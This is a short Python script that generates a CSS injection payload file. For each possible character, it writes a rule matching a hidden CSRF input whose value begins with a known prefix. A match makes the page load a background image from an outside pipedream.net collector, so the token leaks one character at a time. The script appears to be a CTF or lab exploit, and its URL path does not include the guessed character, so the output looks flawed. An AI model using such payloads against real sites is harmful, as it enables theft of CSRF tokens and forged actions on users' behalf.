
f = open("data.css", "w")

for i in range(127):
    f.write('input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'+chr(i)+'"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC:);}')

f.close()